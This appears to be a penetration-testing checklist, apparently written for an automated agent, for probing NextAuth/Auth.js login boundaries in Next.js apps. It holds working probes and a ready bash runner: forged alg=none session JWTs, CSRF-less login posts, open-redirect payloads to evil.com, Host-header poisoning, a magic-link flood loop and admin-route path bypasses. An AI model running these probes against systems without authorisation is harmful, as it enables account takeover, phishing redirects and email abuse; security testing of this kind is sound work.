# NextAuth / Auth.js Dynamic Boundary-Test Checklist

Class-level probe set for "auth boundary testing" briefs against NextAuth-backed
Next.js apps. Designed to be run as ONE bash script (see `run_nextauth_boundary.sh`
pattern at bottom) so the entire evidence base is one `terminal` call.

Assume `B="https://TARGET"`, `LOG=auth_report.txt`, and a `run()` helper that tees
label + curl + full response (status, headers, body) to `$LOG`. Always `curl -4`.

Cookie jar discipline matters here — many checks compare WITH-cookie vs
WITHOUT-cookie. Use `-c jar -b jar` for stateful steps, `-c /dev/null -b /dev/null`
(or no jar) for negative controls.

## (a) Endpoint enumeration

```
GET $B/api/auth/session
GET $B/api/auth/csrf
GET $B/api/auth/providers       # enumerate enabled strategies: google / github / email / credentials
GET $B/api/auth/signin          # note form fields the HTML posts (csrfToken name, callbackUrl)
```

Also GET `$B/api/auth/error?error=Configuration` — error page often reveals which
Auth.js version via the `?error=` allowlist behaviour.

## (b) OAuth callback confusion

```
GET $B/api/auth/callback/google?code=x&state=x&error=access_denied
GET $B/api/auth/callback/credentials                # GET on a POST-only callback — method allowed?
GET $B/api/auth/callback/email?token=x
GET $B/api/auth/callback/oauth                      # unknown provider id — error reveals valid provider list?
```

Look for: HTTP 200 with verbose `error` JSON, distinct responses per provider
(provider-enum oracle), stack traces.

## (c) Session-cookie JWT forgery

Cookies to test (server picks one based on `useSecureCookies`):
`next-auth.session-token`, `__Secure-next-auth.session-token`,
`authjs.session-token`, `__Secure-authjs.session-token`.

Send a forged `alg=none` JWT:

```
TOKEN="<REDACTED-JWT>"
GET $B/api/auth/session   -H "Cookie: __Secure-next-auth.session-token=$TOKEN"
```

Must return `{}` or 401. Anything else = CRITICAL finding.

## (d) CSRF on signin + credentials callback

```
POST $B/api/auth/signin/email        -d 'email=a@x.io'                              # no csrf cookie/header
POST $B/api/auth/callback/credentials -d 'csrfToken=x&username=a&password=a'        # with bad token
```

Must 400/403 with csrf-mismatch. A 200/302 = EXPLOITABLE (login-CSRF / self-XSS chain).

## (e) Open redirect via callbackUrl

Variants to try (record Location header):

```
GET $B/api/auth/signin?callbackUrl=//evil.com
GET $B/signin?callbackUrl=https://evil.com
GET $B/signin?callbackUrl=/\\/evil.com         # backslash bypass
GET $B/signin?callbackUrl=/\\evil.com
GET $B/signin?callbackUrl=%2F%2Fevil.com
GET $B/auth/signout?callbackUrl=https%3A%2F%2Fevil.com
GET $B/api/auth/signout?callbackUrl=javascript:alert(1)
```

Also URL-auth tricks: `callbackUrl=https://trusted.com@evil.com`,
`callbackUrl=https://evil.com?trusted.com`.

## (f) Host / X-Forwarded-Host poisoning

```
GET  $B/api/auth/signin/email   -H 'Host: evil.com'
POST $B/api/auth/signin/email   -H 'X-Forwarded-Host: evil.com' -d 'email=a@x.io&csrfToken=<real>'
GET  $B/api/auth/signin         -H 'X-Forwarded-Host: evil.com'   # inspect form action + callbackUrl
```

Look at: any link in the response body (password-reset / magic-link base URL),
`Set-Cookie` Domain attribute, CSP `form-action` reflecting evil host.

## (g) Email-OTP / magic-link rate limit

Fire 5 POSTs within 5s, distinct emails to dodge per-email cooldown:

```
for i in 1 2 3 4 5; do
  POST $B/api/auth/signin/email -d "email=t$i@x.io&csrfToken=$CSRF" &
done; wait
```

Note: HTTP codes, Retry-After, `x-ratelimit-*`, any 429 threshold.

## (h) Locale / path-prefix bypass on admin routes

```
GET $B/en/admin
GET $B/zh/admin/orders
GET $B/admin/users
GET $B/api/admin/users
GET $B/api/admin/orders
GET $B/api/admin/refund
GET $B/api/admin/invite
GET $B/api/admin/credits
```

Record ALL status codes and first-100-chars. Same status+blob across locale
variants = likely catch-all shell (re-check with pre-flight fingerprint).
Divergent status (e.g. `/api/admin/*` returns 401 but `/en/admin` 200 HTML) is
informative: middleware matcher may exclude `/api/*` or certain locales.

Also try case (`/Admin`, `/ADMIN/users`), trailing slash, encoded slash
(`/%2fadmin/users`), dot-segment (`/%2e/admin`), and path params
(`/admin;.json/users`).

## (i) Method tampering

```
curl -4 -i -X TRACE    $B/admin
curl -4 -i -X OPTIONS  $B/admin
curl -4 -i -X PUT      $B/admin
curl -4 -i -X TRACE    $B/api/auth/session
curl -4 -i -X OPTIONS  $B/api/auth/session      # CORS preflight — note ACAO/ACAH
```

TRACE → 405 expected; TRACE echoing request = old-server finding. OPTIONS
returning `Access-Control-Allow-Origin: *` with credentials = CORS bug.

## (j) Malformed-body error disclosure

```
POST $B/api/auth/signin -H 'Content-Type: application/json' -d 'not-json'
POST $B/api/auth/signin -H 'Content-Type: application/json' -d '{'
POST $B/api/auth/signin -H 'Content-Type: application/json' -d '\x00\x01'
```

Look for stack traces, `PrismaClient` / `NextAuth` / `@auth/core` fingerprints,
file paths (`/var/task/...`), version strings in error payloads.

## (k) Providers endpoint

The body of `GET /api/auth/providers` is ground truth for enabled strategies.
Cross-reference against the JS bundle (grep for `signIn("…"` /
`signIn('…')`) — providers present in code but NOT in `/api/auth/providers`
output are worth probing directly at `/api/auth/callback/<id>` (hidden provider
bypass).

## (l) RSC (React Server Components) auth-shape probe

```
GET $B/admin        -H 'RSC: 1'
GET $B/admin/orders -H 'RSC: 1' -H 'Next-Router-State-Tree: %5B%22%22%5D'
GET $B/api/admin/users?_rsc=1
GET $B/admin?_rsc=abc123
```

Look for:
- Different status/body vs plain GET (RSC stream error = auth check ran, plain
  GET returned SPA shell = middleware-only check → bypass candidate).
- `NEXT_REDIRECT` in RSC stream = redirect enforced.
- Leaked props in RSC payload revealing what *would* render with auth.

## Single-shot runner template

```bash
#!/bin/bash
B="https://TARGET"
cd /tmp/<target>_auth 2>/dev/null || mkdir -p /tmp/<target>_auth && cd /tmp/<target>_auth
LOG=auth_report.txt; : > $LOG
run() {
  local label="$1"; shift
  {
    echo "===== $label ====="
    echo "\$ curl $*"
    curl -s4 -o body.$$ -D hdr.$$ -w 'HTTP %{http_code} time=%{time_total}s\n' "$@"
    echo "--- headers ---"; cat hdr.$$
    echo "--- body ---"; head -c 500 body.$$; echo; echo
  } | tee -a $LOG
}
CSRF=$(curl -s4 -c jar "$B/api/auth/csrf" | jq -r .csrfToken)

# (a) enumeration
for p in /api/auth/session /api/auth/csrf /api/auth/providers /api/auth/signin /api/auth/error?error=Configuration; do
  run "A GET $p" "$B$p"; done

# (b) callback confusion
run "B1 google err" "$B/api/auth/callback/google?code=x&state=x&error=access_denied"
run "B2 creds GET"  "$B/api/auth/callback/credentials"
run "B3 email tok"  "$B/api/auth/callback/email?token=x"
run "B4 unknown"    "$B/api/auth/callback/oauth"

# (c) JWT alg=none
T="<REDACTED-JWT>"
run "C none jwt" -H "Cookie: __Secure-next-auth.session-token=$T" "$B/api/auth/session"

# (d) CSRF negatives
run "D1 email no-csrf"  -X POST -d 'email=a@x.io' "$B/api/auth/signin/email"
run "D2 creds bad-csrf" -X POST -d 'csrfToken=x&username=a&password=a' "$B/api/auth/callback/credentials"

# (e) redirects
for u in '//evil.com' 'https://evil.com' '/\\/evil.com' '%2F%2Fevil.com' 'javascript:alert(1)'; do
  run "E $u" -o /dev/null -D - "$B/api/auth/signin?callbackUrl=$u"; done

# (f) host header
run "F1 host poison"    -H 'Host: evil.com'              "$B/api/auth/signin/email"
run "F2 xfh poison"     -H 'X-Forwarded-Host: evil.com'  "$B/api/auth/signin"

# (g) rate limit
for i in 1 2 3 4 5; do
  run "G$i otp flood" -X POST -b jar -d "email=t$i@x.io&csrfToken=$CSRF" "$B/api/auth/signin/email" &
done; wait

# (h) locale/bypass
for p in /en/admin /zh/admin/orders /admin/users /api/admin/users /api/admin/orders \
         /api/admin/refund /api/admin/invite /api/admin/credits /Admin /%2fadmin; do
  run "H $p" "$B$p"; done

# (i) methods
for m in TRACE OPTIONS PUT; do
  run "I $m /admin"              -X $m "$B/admin"
  run "I $m /api/auth/session"   -X $m "$B/api/auth/session"; done

# (j) malformed body
run "J1 badjson" -X POST -H 'Content-Type: application/json' -d '{' "$B/api/auth/signin"
run "J2 raw"     -X POST -H 'Content-Type: application/json' -d 'not-json' "$B/api/auth/signin"

# (l) RSC
run "L1 rsc admin" -H 'RSC: 1' "$B/admin"
run "L2 rsc admin users" -H 'RSC: 1' "$B/api/admin/users"

echo "DONE — see $LOG ($(wc -l < $LOG) lines)"
```

Run it, then read `$LOG` once — no re-fetching per item.

## Verdict rubric for auth-boundary briefs

- **EXPLOITABLE** — server performed the privileged action despite the defect
  (accepted bad JWT, redirected off-domain, issued a magic link to a poisoned
  host, returned admin data with locale prefix).
- **BLOCKED** — server rejected input with invariant error.
- **DISCOVERY** — informative but not a vuln by itself (provider list, version
  fingerprint, distinct error oracle). Chains upward.
- **NEEDS-AUTH** — same as business-logic rubric; endpoint requires session.
